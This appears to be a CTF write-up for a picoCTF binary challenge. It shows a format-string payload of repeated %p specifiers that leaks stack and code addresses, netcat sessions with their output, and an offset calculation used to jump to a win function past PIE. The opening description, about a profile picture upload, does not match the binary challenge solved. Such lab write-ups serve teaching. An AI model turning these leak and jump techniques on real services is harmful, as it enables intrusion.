## Description
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the `/root` directory.

## Category
#binary  
## Score
200
## Hints
Hint 1:
What vulnerability can be exploited to leak the address?

Hint 2: Please be mindful of the size of pointers in this binary
## Solution
### Enumeration
From the source code, we can see that the user input is unsanitized, which explains for the first hint.
![[Pasted image 20250311214018.png]]

Therefore, we can leak the address with `%p`.

Example: AAAA%p.%p.%p

`%p` is the format specifier for printing pointer addresses in a platform-specific representation (typically hexadecimal with a "0x" prefix). For example, `printf("%p", some_pointer)` might output something like `0x7fffffffe378`.

for the second hint, we don't want to exceed the number of `%p` is important, otherwise it's just gonna push the input to the address jump scanf line.

So the payload should be exactly, 
`AAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p`

Another important thing to do is to dump the functions' address as we need to calculate the offset. This is very important as offset is `IMMUTABLE`

![[Pasted image 20250311214824.png]]

### Exploitation
When we perform a address leak, we can notice some important things:
![[Pasted image 20250311215047.png]]
The addresses at 15th and 18th has the same prefix
![[Pasted image 20250311215109.png]]
0x5b... which means they come from the same memory region and are likely functions in the C file we receive.

If we enter the 15th address, we can see that in loops the input thing
![[Pasted image 20250311215207.png]]

So if we follow intuition, we would expect that this address is from the `call_functions`, then calculate the offset to find win like `PIE_TIME_1`. However, that doesn't work but you are free to try.

```bash
┌──(atlas㉿kali)-[~/Desktop]
└─$ nc rescued-float.picoctf.net 53047
Enter your name:AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAA0x5935710d52a1.(nil).(nil).0x7ffd26255020.0x7c.0x7ffd262df228.0x74a720ec96a0.0x252e702541414141.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x70252e70252e70.0x59353da9a1c0.0x37f3eaa5a56fb500.0x7ffd26255080.0x59353da9a441.(nil) enter the address to jump to, ex => 0x12345: 0x59353da9a3ab
^C
                                                                                                                                                      
┌──(atlas㉿kali)-[~/Desktop]
└─$ nc rescued-float.picoctf.net 53047
Enter your name:AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAA0x5734b88822a1.(nil).(nil).0x7ffca7c918a0.0x7c.0x7ffca7cfc228.0x762973f016a0.0x252e702541414141.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x70252e70252e70.0x57349d5a11c0.0x512885fc5f3cab00.0x7ffca7c91900.0x57349d5a1441.(nil) enter the address to jump to, ex => 0x12345: 0x57349d5a11c0
Enter your name:
 enter the address to jump to, ex => 0x12345: 0x57349d5a1263
Segfault Occurred, incorrect address.
^C
                                                                                                                                                      
┌──(atlas㉿kali)-[~/Desktop]
└─$ nc rescued-float.picoctf.net 53047
Enter your name:AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAA0x616ade2cd2a1.(nil).(nil).0x7fff7ad0c410.0x7c.0x7fff7ad64228.0x79c8251c86a0.0x252e702541414141.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x70252e70252e70.0x616ab8a7a1c0.0x8115bf3cc6ec2300.0x7fff7ad0c470.0x616ab8a7a441.(nil) enter the address to jump to, ex => 0x12345: 0x616ab8a7a36a
```

After looking at the output for long enough, you can see that the 15th and 18th address has a common thing each time we connect to the server. Their `affix` of `1c0` and `441` respectively.

So if we look back at the address dump we made with `gdb`, we can see that `1c0` is the affix of the `_start` function and `441` is close to the `main` function address

So if we calculate the offset between ` _start` and `win`, it's 0x01AA

The next time we run, we simply add 0x01AA to whatever the 15th address is.

![[Pasted image 20250311220032.png]]

